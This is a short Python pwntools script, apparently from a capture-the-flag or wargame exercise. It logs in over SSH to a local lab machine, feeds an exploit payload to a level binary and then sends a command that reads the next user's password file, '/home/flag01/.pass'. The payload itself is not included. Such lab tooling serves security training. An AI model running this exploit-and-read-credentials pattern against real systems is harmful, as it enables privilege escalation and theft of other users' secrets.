from pwn import *

def run_level(user, pwd, binary_name, payload):
    connection = ssh(host="localhost", user=user, password=pwd, port=4242, timeout=10)
    sh = connection.process(['/usr/bin/bash', '-c', f'ulimit -c 0; exec ./{binary_name}'], env={})

    sh.recvuntil(b"Waiting for operator ID:")
    sh.sendline(payload)

    sh.sendline(b"cat /home/flag01/.pass;exit")
    output = sh.recvall(timeout=1).decode(errors="replace")

    sh.close()
    connection.close()
    return output.splitlines()[1][4:]